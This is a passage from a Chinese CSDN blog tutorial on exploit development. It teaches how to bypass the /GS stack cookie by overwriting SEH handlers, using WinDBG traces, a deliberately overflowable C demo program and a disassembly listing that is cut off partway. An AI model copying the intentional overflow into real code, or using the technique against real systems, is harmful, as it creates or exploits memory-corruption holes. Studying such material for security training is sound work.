

<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <link rel="canonical" href="https://blog.csdn.net/dupei/article/details/53731221"/>
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta name="renderer" content="webkit"/>
    <meta name="force-rendering" content="webkit"/>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="report" content='{"pid": "blog", "spm":"1001.2101"}'>
    <meta name="referrer" content="always">
    <meta http-equiv="Cache-Control" content="no-siteapp" /><link rel="alternate" media="handheld" href="#" />
    <meta name="shenma-site-verification" content="5a59773ab8077d4a62bf469ab966a63b_1497598848">
    <meta name="applicable-device" content="pc">
    <link  href="https://g.csdnimg.cn/static/logo/favicon32.ico"  rel="shortcut icon" type="image/x-icon" />
    <title>Exploit Development – 使用SEH绕过Security Cookie_MD的技术博客-CSDN博客</title>
    <script__>
      (function(){ 
        var el = document.createElement("script"); 
        el.src = "https://s3a.pstatp.com/toutiao/push.js?1abfa13dfe74d72d41d83c86d240de427e7cac50c51ead53b2e79d40c7952a23ed7716d05b4a0f683a653eab3e214672511de2457e74e99286eb2c33f4428830"; 
        el.id = "ttzz"; 
        var s = document.getElementsByTagName("script")[0]; 
        s.parentNode.insertBefore(el, s);
      })(window)
    </script__>
        <meta name="keywords" content="Exploit Development – 使用SEH绕过Security Cookie">
        <meta name="csdn-baidu-search"  content='{"autorun":true,"install":true,"keyword":"Exploit Development – 使用SEH绕过Security Cookie"}'>
    <meta name="description" content="前面我们介绍在关闭/GS和DEP的情况下，如何利用栈溢出来实现exploit。下面我们会开启/GS，以及介绍突破/GS的常用手法。">
    <script__ src="//g.csdnimg.cn/tingyun/1.8.5/blog.js" type='text/javascript'></script__>
        <link rel="stylesheet" type="text/css" href="https://csdnimg.cn/release/blogv2/dist/pc/css/detail_enter-f9e4752b90.min.css">
        <link rel="stylesheet" type="text/css" href="https://csdnimg.cn/release/blogv2/dist/pc/themesSkin/skin-blackboard/skin-blackboard-3adcc2c475.min.css">
    <script__ src="https://csdnimg.cn/public/common/libs/jquery/jquery-1.9.1.min.js" type="text/javascript"></script__>
    <script__ type="text/javascript">
        var isCorporate = false;//注释删除enterprise
        var username =  "dupei";
        var skinImg = "white";
        var blog_address = "https://blog.csdn.net/dupei";
        var currentUserName = "";
        var isOwner = false;
        var loginUrl = "http://passport.csdn.net/account/login?from=https://blog.csdn.net/dupei/article/details/53731221";
        var blogUrl = "https://blog.csdn.net/";
        var avatar = "https://profile.csdnimg.cn/8/E/2/3_dupei";
        var articleTitle = "Exploit Development – 使用SEH绕过Security Cookie";
        var articleDesc = "前面我们介绍在关闭/GS和DEP的情况下，如何利用栈溢出来实现exploit。下面我们会开启/GS，以及介绍突破/GS的常用手法。";
        var articleTitles = "Exploit Development – 使用SEH绕过Security Cookie_MD的技术博客-CSDN博客";
        var nickName = "dupei";
        var articleDetailUrl = "https://blog.csdn.net/dupei/article/details/53731221";
        if(window.location.host.split('.').length == 3) {
            blog_address = blogUrl + username;
        }
        var skinStatus = "White";
        var blogStaticHost = "https://csdnimg.cn/release/blogv2/"
    </script__>
    <script__ src="https://g.csdnimg.cn/??fixed-sidebar/1.1.6/fixed-sidebar.js" type="text/javascript"></script__>
    <script__ src='//g.csdnimg.cn/common/csdn-report/report.js' type='text/javascript'></script__>
    <link rel="stylesheet" type="text/css" href="https://csdnimg.cn/public/sandalstrap/1.4/css/sandalstrap.min.css">
    <style>
        .MathJax, .MathJax_Message, .MathJax_Preview{
            display: none
        }
    </style>
    <script__ src="https://dup.baidustatic.com/js/ds.js"></script__>
</head>
<body class="nodata " style="">
        <script__>
            var toolbarSearchExt = '{"landingWord":[],"queryWord":"","tag":[],"title":"Exploit Development &ndash; 使用SEH绕过Security Cookie"}';
        </script__>
    <script__ src="https://g.csdnimg.cn/common/csdn-toolbar/csdn-toolbar.js" type="text/javascript"></script__>
    <script__>
    (function(){
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        }
        else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
    </script__>
<link rel="stylesheet" href="https://csdnimg.cn/release/blogv2/dist/pc/css/blog_code-01256533b5.min.css">
<link rel="stylesheet" href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/chart-3456820cac.css" />
<div class="main_father clearfix d-flex justify-content-center" style="height:100%;"> 
    <div class="container clearfix" id="mainBox">
        <main>
<script__ type="text/javascript">
    var blogSensitiveWords = "";
    function getQueryString(name) {   
      var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)"); //构造一个含有目标参数的正则表达式对象  
      var r = window.location.search.substr(1).match(reg);  //匹配目标参数
      if( r != null ) return decodeURIComponent( r[2] ); return '';   
    }
    function stripscript(s){ 
      var pattern = new RegExp("[`~!@#$^&*()=|{}':;',\\[\\].<>/?~！@#￥……&*（）——|{}【】‘；：”“'。，、？%]") 
      var rs = ""; 
      for (var i = 0; i < s.length; i++) { 
        rs = rs+s.substr(i, 1).replace(pattern, ''); 
      } 
      return rs; 
    }
    var blogHotWords = stripscript(getQueryString('utm_term')).length > 1 ? stripscript(getQueryString('utm_term')) : ''
</script__>
<div class="blog-content-box">
    <div class="article-header-box">
        <div class="article-header">
            <div class="article-title-box">
                <h1 class="title-article" id="articleContentId">Exploit Development – 使用SEH绕过Security Cookie</h1>
            </div>
            <div class="article-info-box">
                <div class="article-bar-top">
                    <img class="article-type-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/original.png" alt="">
                    <div class="bar-content">
                    <a class="follow-nickName " href="https://blog.csdn.net/dupei" target="_blank" rel="noopener">dupei</a>
                    <span class="time">2016-12-18 23:17:25</span>
                    <img class="article-read-img article-heard-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/articleReadEyes.png" alt="">
                    <span class="read-count">2187</span>
                    <a id="blog_detail_zk_collection" class="un-collection" data-report-click='{"mod":"popu_823","spm":"1001.2101.3001.4232","ab":"new"}'>
                        <img class="article-collect-img article-heard-img un-collect-status isdefault" style="display:inline-block" src="https://csdnimg.cn/release/blogv2/dist/pc/img/tobarCollect.png" alt="">
                        <img class="article-collect-img article-heard-img collect-status isactive" style="display:none" src="https://csdnimg.cn/release/blogv2/dist/pc/img/tobarCollectionActive.png" alt="">
                        <span class="name">收藏</span>
                        <span class="get-collection">
                        </span>
                    </a>
                    </div>
                </div>
                <div class="blog-tags-box">
                    <div class="tags-box artic-tag-box">
                            <span class="label">分类专栏：</span>
                                <a class="tag-link" href="https://blog.csdn.net/dupei/category_879039.html" target="_blank" rel="noopener">Security</a>
                    </div>
                </div>
                <div class="slide-content-box">
                    <div class="article-copyright">
                        <div class="creativecommons">
                            版权声明：本文为博主原创文章，遵循<a href="http://creativecommons.org/licenses/by-sa/4.0/" target="_blank" rel="noopener"> CC 4.0 BY-SA </a>版权协议，转载请附上原文出处链接和本声明。
                        </div>
                        <div class="article-source-link">
                            本文链接：<a href="https://blog.csdn.net/dupei/article/details/53731221" target="_blank">https://blog.csdn.net/dupei/article/details/53731221</a>
                        </div>
                    </div>
                </div>
                <div class="operating">
                    <a class="href-article-edit slide-toggle">版权</a>
                </div>
            </div>
        </div>
    </div>
    <div id="csdn-shop-window-top" class="csdn-shop-window-common" style="margin-top:18px;padding:0"></div>
    <article class="baidu_pl">
        <div id="article_content" class="article_content clearfix">
        <link rel="stylesheet" href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/ck_htmledit_views-b5506197d8.css">
                <div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p>前面我们介绍在关闭/GS和DEP的情况下&#xff0c;如何利用栈溢出来实现exploit。下面我们会开启/GS&#xff0c;以及介绍突破/GS的常用手法。 <br /> 我们先开启/GS&#xff0c;编译一个build&#xff0c;再试试原先的exploit&#xff0c;看看会有什么问题。 <br /> 使用原先的msg.dat会导致程序crash&#xff0c;从下面的分析可以看出&#xff0c;WinDBG是可以给出栈溢出的信息的。具体原因是由于开启/GS选项以后&#xff0c;会在return之前&#xff0c;调用__security_check_cookie检测栈上的cookie是否被修改&#xff0c;如果发现被修改&#xff0c;就认为是栈溢出&#xff0c;抛异常。</p> 
<pre class="prettyprint"><code class=" hljs tex">CommandLine: C:<span class="hljs-command">\Users</span><span class="hljs-command">\Administrator</span><span class="hljs-command">\Desktop</span><span class="hljs-command">\stack</span>_overflow<span class="hljs-command">\test</span>_x86_with_gs_no_dep.exe msg.dat
Starting directory: C:<span class="hljs-command">\Users</span><span class="hljs-command">\Administrator</span><span class="hljs-command">\Desktop</span><span class="hljs-command">\stack</span>_overflow

************* Symbol Path validation summary **************
Response                         Time (ms)     Location
Deferred                                       SRV*C:<span class="hljs-command">\Symbol</span><span class="hljs-command">\web</span>_symbol*http://msdl.microsoft.com/download/symbols
Symbol search path is: SRV*C:<span class="hljs-command">\Symbol</span><span class="hljs-command">\web</span>_symbol*http://msdl.microsoft.com/download/symbols
Executable search path is: 
ModLoad: 013b0000 013b6000   test_x86_with_gs_no_dep.exe
ModLoad: 77cb0000 77e30000   ntdll.dll
ModLoad: 75a30000 75b40000   C:<span class="hljs-command">\Windows</span><span class="hljs-command">\syswow</span>64<span class="hljs-command">\kernel</span>32.dll
ModLoad: 76160000 761a6000   C:<span class="hljs-command">\Windows</span><span class="hljs-command">\syswow</span>64<span class="hljs-command">\KERNELBASE</span>.dll
ModLoad: 73590000 73666000   C:<span class="hljs-command">\Windows</span><span class="hljs-command">\SysWOW</span>64<span class="hljs-command">\MSVCR</span>110.dll

STATUS_STACK_BUFFER_OVERRUN encountered
(814.5c0): Break instruction exception - code 80000003 (first chance)
eax&#61;00000000 ebx&#61;013b2108 ecx&#61;75a801b8 edx&#61;001af851 esi&#61;00000000 edi&#61;00000000
eip&#61;75a7ff99 esp&#61;001afa98 ebp&#61;001afb14 iopl&#61;0         nv up ei pl zr na pe nc
cs&#61;0023  ss&#61;002b  ds&#61;002b  es&#61;002b  fs&#61;0053  gs&#61;002b             efl&#61;00000246
kernel32!UnhandledExceptionFilter&#43;0x5f:
75a7ff99 cc              int     3
0:000&gt; kn
 <span class="hljs-special">#</span> ChildEBP RetAddr  
00 001afb14 736300f1 kernel32!UnhandledExceptionFilter&#43;0x5f
01 001afb20 013b138e MSVCR110!__crtUnhandledException&#43;0x14
02 001afb30 013b14a5 test_x86_with_gs_no_dep!__raise_securityfailure&#43;0x1d
03 001afe60 013b10eb test_x86_with_gs_no_dep!__report_gsfailure&#43;0xf7
04 001afe8c 0082e8fc test_x86_with_gs_no_dep!main&#43;0xeb 
0:000&gt; ub 013b10eb 
test_x86_with_gs_no_dep!main&#43;0xd4 <span class="hljs-special">[</span>z:<span class="hljs-command">\d</span>_disk<span class="hljs-command">\workspace</span><span class="hljs-command">\vs</span>_2012<span class="hljs-command">\test</span><span class="hljs-command">\stack</span>_overflow.cpp &#64; 19<span class="hljs-special">]</span>:
013b10d4 ff15a4203b01    call    dword ptr <span class="hljs-special">[</span>test_x86_with_gs_no_dep!_imp__printf (013b20a4)<span class="hljs-special">]</span>
013b10da 8b4dfc          mov     ecx,dword ptr <span class="hljs-special">[</span>ebp-4<span class="hljs-special">]</span>
013b10dd 83c438          add     esp,38h
013b10e0 33cd            xor     ecx,ebp
013b10e2 5b              pop     ebx
013b10e3 33c0            xor     eax,eax
013b10e5 5e              pop     esi
013b10e6 e804000000      call    test_x86_with_gs_no_dep!__security_check_cookie (013b10ef)</code></pre> 
<p>绕过Stack Cookie的方式也有很多&#xff0c;比较简单稳定的方式是覆写SEH hander。首先需要了解SEH的原理&#xff0c;网上资料很多&#xff0c;这里推荐参考《软件调试》第24章的内容。 <br /> 下面直接从利用调试器看看SEH 是什么&#xff0c;以及如何存放的。 <br /> 下面列出三种查看异常处理链的方式&#xff1a;</p> 
<ul><li>使用!exchain</li></ul> 
<pre class="prettyprint"><code class=" hljs erlang-repl"><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; <span class="hljs-exclamation_mark">!</span><span class="hljs-function_or_atom">exchain</span>
<span class="hljs-number">0032</span>fd04: <span class="hljs-function_or_atom">test_x86_no_dep</span><span class="hljs-exclamation_mark">!</span>_except_handler4&#43;<span class="hljs-number">0</span> (<span class="hljs-number">01291749</span>)
  <span class="hljs-variable">CRT</span> <span class="hljs-function_or_atom">scope</span>  <span class="hljs-number">0</span>, <span class="hljs-function_or_atom">filter</span>: <span class="hljs-function_or_atom">test_x86_no_dep</span><span class="hljs-exclamation_mark">!</span>__tmain<span class="hljs-variable">CRTStartup</span>&#43;<span class="hljs-number">115</span> (<span class="hljs-number">012912</span>de)
                <span class="hljs-function_or_atom">func</span>:   <span class="hljs-function_or_atom">test_x86_no_dep</span><span class="hljs-exclamation_mark">!</span>__tmain<span class="hljs-variable">CRTStartup</span>&#43;<span class="hljs-number">129</span> (<span class="hljs-number">012912</span>f2)
<span class="hljs-number">0032</span>fd50: <span class="hljs-function_or_atom">ntdll</span><span class="hljs-exclamation_mark">!</span>_except_handler4&#43;<span class="hljs-number">0</span> (<span class="hljs-number">77</span>d271d5)
  <span class="hljs-variable">CRT</span> <span class="hljs-function_or_atom">scope</span>  <span class="hljs-number">0</span>, <span class="hljs-function_or_atom">filter</span>: <span class="hljs-function_or_atom">ntdll</span><span class="hljs-exclamation_mark">!</span>__<span class="hljs-variable">RtlUserThreadStart</span>&#43;<span class="hljs-number">2</span>e (<span class="hljs-number">77</span>d274b0)
                <span class="hljs-function_or_atom">func</span>:   <span class="hljs-function_or_atom">ntdll</span><span class="hljs-exclamation_mark">!</span>__<span class="hljs-variable">RtlUserThreadStart</span>&#43;<span class="hljs-number">63</span> (<span class="hljs-number">77</span>d290cb)</code></pre> 
<ul><li>使用FS段寄存器</li></ul> 
<pre class="prettyprint"><code class=" hljs fix"><span class="hljs-attribute">0:000&gt; ?poi(fs:[0])
Evaluate expression: 3341572 </span>&#61;<span class="hljs-string"> 0032fd04</span></code></pre> 
<ul><li>使用TEB</li></ul> 
<pre class="prettyprint"><code class=" hljs css">0<span class="hljs-pseudo">:000</span>&gt; !<span class="hljs-tag">teb</span>
<span class="hljs-tag">TEB</span> <span class="hljs-tag">at</span> 7<span class="hljs-tag">efdd000</span>
    <span class="hljs-tag">ExceptionList</span>:        0032<span class="hljs-tag">fd04</span>
    <span class="hljs-tag">StackBase</span>:            00330000
    <span class="hljs-tag">StackLimit</span>:           0032<span class="hljs-tag">e000</span>
    <span class="hljs-tag">SubSystemTib</span>:         00000000
    <span class="hljs-tag">FiberData</span>:            00001<span class="hljs-tag">e00</span>
    <span class="hljs-tag">ArbitraryUserPointer</span>: 00000000
    <span class="hljs-tag">Self</span>:                 7<span class="hljs-tag">efdd000</span>
    <span class="hljs-tag">EnvironmentPointer</span>:   00000000
    <span class="hljs-tag">ClientId</span>:             00000390 . 00000204
    <span class="hljs-tag">RpcHandle</span>:            00000000
    <span class="hljs-tag">Tls</span> <span class="hljs-tag">Storage</span>:          7<span class="hljs-tag">efdd02c</span>
    <span class="hljs-tag">PEB</span> <span class="hljs-tag">Address</span>:          7<span class="hljs-tag">efde000</span>
    <span class="hljs-tag">LastErrorValue</span>:       0
    <span class="hljs-tag">LastStatusValue</span>:      <span class="hljs-tag">c0000139</span>
    <span class="hljs-tag">Count</span> <span class="hljs-tag">Owned</span> <span class="hljs-tag">Locks</span>:    0
    <span class="hljs-tag">HardErrorMode</span>:        0</code></pre> 
<p>上面使用!exchain列出的exception list&#xff0c;也可以使用纯手工的方式搜索出来。</p> 
<pre class="prettyprint"><code class=" hljs erlang-repl"><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; <span class="hljs-function_or_atom">dt</span> _<span class="hljs-variable">EXCEPTION_REGISTRATION_RECORD</span>
<span class="hljs-function_or_atom">test_x86_no_dep</span><span class="hljs-exclamation_mark">!</span>_<span class="hljs-variable">EXCEPTION_REGISTRATION_RECORD</span>
   &#43;<span class="hljs-number">0</span>x000 <span class="hljs-variable">Next</span>             : <span class="hljs-variable">Ptr32</span> _<span class="hljs-variable">EXCEPTION_REGISTRATION_RECORD</span>
   &#43;<span class="hljs-number">0</span>x004 <span class="hljs-variable">Handler</span>          : <span class="hljs-variable">Ptr32</span>     _<span class="hljs-variable">EXCEPTION_DISPOSITION</span> 
<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; <span class="hljs-function_or_atom">dt</span> _<span class="hljs-variable">EXCEPTION_REGISTRATION_RECORD</span> <span class="hljs-number">0032</span>fd04
<span class="hljs-function_or_atom">test_x86_no_dep</span><span class="hljs-exclamation_mark">!</span>_<span class="hljs-variable">EXCEPTION_REGISTRATION_RECORD</span>
   &#43;<span class="hljs-number">0</span>x000 <span class="hljs-variable">Next</span>             : <span class="hljs-number">0</span>x0032fd50 _<span class="hljs-variable">EXCEPTION_REGISTRATION_RECORD</span>
   &#43;<span class="hljs-number">0</span>x004 <span class="hljs-variable">Handler</span>          : <span class="hljs-number">0</span>x01291749     _<span class="hljs-variable">EXCEPTION_DISPOSITION</span>  <span class="hljs-function_or_atom">test_x86_no_dep</span><span class="hljs-exclamation_mark">!</span>_except_handler4&#43;<span class="hljs-number">0</span>
<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; <span class="hljs-function_or_atom">dt</span> _<span class="hljs-variable">EXCEPTION_REGISTRATION_RECORD</span> <span class="hljs-number">0</span>x0032fd50 
<span class="hljs-function_or_atom">test_x86_no_dep</span><span class="hljs-exclamation_mark">!</span>_<span class="hljs-variable">EXCEPTION_REGISTRATION_RECORD</span>
   &#43;<span class="hljs-number">0</span>x000 <span class="hljs-variable">Next</span>             : <span class="hljs-number">0</span>xffffffff _<span class="hljs-variable">EXCEPTION_REGISTRATION_RECORD</span>
   &#43;<span class="hljs-number">0</span>x004 <span class="hljs-variable">Handler</span>          : <span class="hljs-number">0</span>x77d271d5     _<span class="hljs-variable">EXCEPTION_DISPOSITION</span>  <span class="hljs-function_or_atom">ntdll</span><span class="hljs-exclamation_mark">!</span>_except_handler4&#43;<span class="hljs-number">0</span></code></pre> 
<p>从栈地址的信息可以看出&#xff0c;SEH 是存放在栈上的。</p> 
<pre class="prettyprint"><code class=" hljs fix"><span class="hljs-attribute">0:000&gt; r esp
esp</span>&#61;<span class="hljs-string">0032fcd8</span></code></pre> 
<p>在开始编写exploit之前&#xff0c;重新编译测试程序&#xff0c;这一次&#xff0c;将/SAFESEH option关闭。目的是为了简化exploit的难度&#xff0c;因为/SAFESEH是防止覆写SEH的有效手段&#xff0c;当然&#xff0c;这种手段也是可以被绕过的&#xff0c;以后&#xff0c;有时间会介绍。 <br /> 为了方便说明SEH的问题&#xff0c;我们使用下面的这段code编译一个exe来演示&#xff1a;</p> 
<pre class="prettyprint"><code class=" hljs perl"><span class="hljs-comment">#include &lt;cstdio&gt;</span>

<span class="hljs-keyword">int</span> main(<span class="hljs-keyword">int</span> argc, char<span class="hljs-variable">**</span> argv) {
    <span class="hljs-keyword">if</span> (argc !&#61; <span class="hljs-number">2</span>) {
        <span class="hljs-keyword">printf</span>(<span class="hljs-string">&#34;Usage:\n   test.exe file_path&#34;</span>);
        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;
    }

    char msg[<span class="hljs-number">32</span>] &#61; <span class="hljs-string">{0}</span>;
    <span class="hljs-keyword">printf</span>(<span class="hljs-string">&#34;Reading msg from file...\n&#34;</span>);
    FILE <span class="hljs-variable">*f</span> &#61; fopen(argv[<span class="hljs-number">1</span>], <span class="hljs-string">&#34;rb&#34;</span>);
    <span class="hljs-keyword">if</span> (!f) {
        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;
    }
    fseek(f, 0L, SEEK_END);
    long bytes &#61; ftell(f);
    fseek(f, 0L, SEEK_SET);

    <span class="hljs-keyword">int</span> <span class="hljs-keyword">pos</span> &#61; <span class="hljs-number">0</span>;
    <span class="hljs-keyword">while</span> (<span class="hljs-keyword">pos</span> &lt; bytes) {
        <span class="hljs-keyword">int</span> len &#61; bytes - <span class="hljs-keyword">pos</span> &gt; <span class="hljs-number">200</span> ? <span class="hljs-number">200</span> : bytes - <span class="hljs-keyword">pos</span>;
        fread(msg &#43; <span class="hljs-keyword">pos</span>, <span class="hljs-number">1</span>, len, f);
        <span class="hljs-keyword">pos</span> &#43;&#61; len;
    }

    fclose(f);
    <span class="hljs-keyword">printf</span>(<span class="hljs-string">&#34;<span class="hljs-variable">%s</span>\n&#34;</span>, msg);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}</code></pre> 
<p>使用10000个’a’填充msg.dat&#xff0c;看看有什么情况发生&#xff0c;结果程序crash&#xff0c;而且EIP被修改为0x61616161&#xff0c;看来我们是可以通过栈溢出控制EIP的。</p> 
<pre class="prettyprint"><code class=" hljs erlang-repl">(<span class="hljs-number">568.4e0</span>): <span class="hljs-variable">Access</span> <span class="hljs-function_or_atom">violation</span> - <span class="hljs-function_or_atom">code</span> <span class="hljs-function_or_atom">c0000005</span> (<span class="hljs-exclamation_mark">!</span><span class="hljs-exclamation_mark">!</span><span class="hljs-exclamation_mark">!</span> <span class="hljs-function_or_atom">second</span> <span class="hljs-function_or_atom">chance</span> <span class="hljs-exclamation_mark">!</span><span class="hljs-exclamation_mark">!</span><span class="hljs-exclamation_mark">!</span>)
<span class="hljs-function_or_atom">eax</span>&#61;<span class="hljs-number">00000000</span> <span class="hljs-function_or_atom">ebx</span>&#61;<span class="hljs-number">00000000</span> <span class="hljs-function_or_atom">ecx</span>&#61;<span class="hljs-number">61616161</span> <span class="hljs-function_or_atom">edx</span>&#61;<span class="hljs-number">7737</span>b46d <span class="hljs-function_or_atom">esi</span>&#61;<span class="hljs-number">00000000</span> <span class="hljs-function_or_atom">edi</span>&#61;<span class="hljs-number">00000000</span>
<span class="hljs-function_or_atom">eip</span>&#61;<span class="hljs-number">61616161</span> <span class="hljs-function_or_atom">esp</span>&#61;<span class="hljs-number">0017127</span>c <span class="hljs-function_or_atom">ebp</span>&#61;<span class="hljs-number">0017129</span>c <span class="hljs-function_or_atom">iopl</span>&#61;<span class="hljs-number">0</span>         <span class="hljs-function_or_atom">nv</span> <span class="hljs-function_or_atom">up</span> <span class="hljs-function_or_atom">ei</span> <span class="hljs-function_or_atom">pl</span> <span class="hljs-function_or_atom">zr</span> <span class="hljs-function_or_atom">na</span> <span class="hljs-function_or_atom">pe</span> <span class="hljs-function_or_atom">nc</span>
<span class="hljs-function_or_atom">cs</span>&#61;<span class="hljs-number">0023</span>  <span class="hljs-function_or_atom">ss</span>&#61;<span class="hljs-number">002</span>b  <span class="hljs-function_or_atom">ds</span>&#61;<span class="hljs-number">002</span>b  <span class="hljs-function_or_atom">es</span>&#61;<span class="hljs-number">002</span>b  <span class="hljs-function_or_atom">fs</span>&#61;<span class="hljs-number">0053</span>  <span class="hljs-function_or_atom">gs</span>&#61;<span class="hljs-number">002</span>b             <span class="hljs-function_or_atom">efl</span>&#61;<span class="hljs-number">00010246</span>
<span class="hljs-number">61616161</span> ??              ???</code></pre> 
<p>为什么会出现这种crash&#xff1f;下面我们开始分析一下。 <br /> 先看看这个函数的反汇编代码&#xff1a;</p> 
<pre class="prettyprint"><code class=" hljs avrasm"><span class="hljs-label">.text:</span><span class="hljs-number">00401000</span> <span class="hljs-comment">; &#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61; S U B R O U T I N E &#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;</span>
<span class="hljs-label">.text:</span><span class="hljs-number">00401000</span>
<span class="hljs-label">.text:</span><span class="hljs-number">00401000</span> <span class="hljs-comment">; Attributes: bp-based frame</span>
<span class="hljs-label">.text:</span><span class="hljs-number">00401000</span>
<span class="hljs-label">.text:</span><span class="hljs-number">00401000</span> <span class="hljs-comment">; int __cdecl main(int argc, const char **argv, const char **envp)</span>
<span class="hljs-label">.text:</span><span class="hljs-number">00401000</span> _main           proc near               <span class="hljs-comment">; CODE XREF: __tmainCRTStartup&#43;F8p</span>
<span class="hljs-label">.text:</span><span class="hljs-number">00401000</span>
<span class="hljs-label">.text:</span><span class="hljs-number">00401000</span> var_28          &#61; dword ptr -<span class="hljs-number">28</span>h
<span class="hljs-label">.text:</span><span class="hljs-number">00401000</span> msg             &#61; byte ptr -<span class="hljs-number">24</span>h
<span class="hljs-label">.text:</span><span class="hljs-number">00401000</span> var_4           &#61; dword ptr -<span class="hljs-number">4</span>
<span class="hljs-label">.text:</span><span class="hljs-number">00401000</span> argc            &#61; dword ptr  <span class="hljs-number">8</span>
<span class="hljs-label">.text:</span><span class="hljs-number">00401000</span> argv            &#61; dword ptr  <span class="hljs-number">0</span>Ch
<span class="hljs-label">.text:</span><span class="hljs-number">00401000</span> envp            &#61; dword ptr  <span class="hljs-number">10</span>h
<span class="hljs-label">.text:</span><span class="hljs-number">00401000</span>
<span class="hljs-label">.text:</span><span class="hljs-number">00401000</span>                 <span class="hljs-keyword">push</span>    ebp
<span class="hljs-label">.text:</span><span class="hljs-number">00401001</span>                 <span class="hljs-keyword">mov</span>     ebp, esp
<span class="hljs-label">.text:</span><span class="hljs-number">00401003</span>                 <span class="hljs-keyword">sub</span>     esp, <span class="hljs-number">28</span>h
<span class="hljs-label">.text:</span><span class="hljs-number">00401006</span>                 <span class="hljs-keyword">mov</span>     eax, ___security_cookie
<span class="hljs-label">.text:</span><span class="hljs-number">0040100</span>B                 xor     eax, ebp
<span class="hljs-label">.text:</span><span class="hljs-number">0040100</span>D                 <span class="hljs-keyword">mov</span>     [ebp&#43;var_4], eax
<span class="hljs-label">.text:</span><span class="hljs-number">00401010</span>                 cmp     [ebp&#43;argc], <span class="hljs-number">2</span>
<span class="hljs-label">.text:</span><span class="hljs-number">00401014</span>                 <span class="hljs-keyword">push</span>    esi
<span class="hljs-label">.text:</span><span class="hljs-number">00401015</span>                 <span class="hljs-keyword">mov</span>     esi, [ebp&#43;argv]
<span class="hljs-label">.text:</span><span class="hljs-number">00401018</span>                 jz      short loc_40103A
<span class="hljs-label">.text:</span><span class="hljs-number">0040101</span>A                 <span class="hljs-keyword">push</span>    offset Format   <span class="hljs-comment">; &#34;Usage:\n   test.exe file_path&#34;</span>
<span class="hljs-label">.text:</span><span class="hljs-number">0040101</span>F                 <span class="hljs-keyword">call</span>    ds:__imp__printf
<span class="hljs-label">.text:</span><span class="hljs-number">00401025</span>                 <span class="hljs-keyword">add</span>     esp, <span class="hljs-number">4</span>
<span class="hljs-label">.text:</span><span class="hljs-number">00401028</span>                 <span class="hljs-keyword">or</span>      eax, <span class="hljs-number">0</span>FFFFFFFFh
<span class="hljs-label">.text:</span><span class="hljs-number">0040102</span>B                 <span class="hljs-keyword">pop</span>     esi
<span class="hljs-label">.text:</span><span class="hljs-number">0040102</span>C                 <span class="hljs-keyword">mov</span>     ecx, [ebp&#43;var_4]
<span class="hljs-label">.text:</span><span class="hljs-number">0040102</span>F                 xor     ecx, ebp        <span class="hljs-comment">; cookie</span>
<span class="hljs-label">.text:</span><span class="hljs-number">00401031</span>                 <span class="hljs-keyword">call</span>    &#64;__security_check_cookie<span class="hljs-localvars">&#64;4</span> <span class="hljs-comment">; __security_check_cookie(x)</span>
<span class="hljs-label">.text:</span><span class="hljs-number">00401036</span>                 <span class="hljs-keyword">mov</span>     esp, ebp
<span class="hljs-label">.text:</span><span class="hljs-number">00401038</span>                 <span class="hljs-keyword">pop</span>     ebp
<span class="hljs-label">.text:</span><span class="hljs-number">00401039</span>                 retn
<span class="hljs-label">.text:</span><span class="hljs-number">0040103</span>A <span class="hljs-comment">; ---------------------------------------------------------------------------</span>
<span class="hljs-label">.text:</span><span class="hljs-number">0040103</span>A
<span class="hljs-label">.text:</span><span class="hljs-number">0040103</span>A loc_40103A:                             <span class="hljs-comment">; CODE XREF: _main&#43;18j</span>
<span class="hljs-label">.text:</span><span class="hljs-number">0040103</span>A                 xorps   xmm0, xmm0
<span class="hljs-label">.text:</span><span class="hljs-number">0040103</span>D                 <span class="hljs-keyword">push</span>    ebx
<span class="hljs-label">.text:</span><span class="hljs-number">0040103</span>E                 <span class="hljs-keyword">push</span>    offset aReadingMsgFrom <span class="hljs-comment">; &#34;Reading msg from file...\n&#34;</span>
<span class="hljs-label">.text:</span><span class="hljs-number">00401043</span>                 <span class="hljs-keyword">mov</span>     [ebp&#43;msg], <span class="hljs-number">0</span>
<span class="hljs-label">.text:</span><span class="hljs-number">00401047</span>                 movq    qword ptr [ebp&#43;msg&#43;<span class="hljs-number">1</span>], xmm0
<span class="hljs-label">.text:</span><span class="hljs-number">0040104</span>C                 movq    qword ptr [ebp&#43;msg&#43;<span class="hljs-number">9</span>], xmm0
<span class="hljs-label">.text:</span><span class="hljs-number">00401051</span>                 movq    qword ptr [ebp&#43;msg&#43;<span class="hljs-number">11</span>h], xmm0
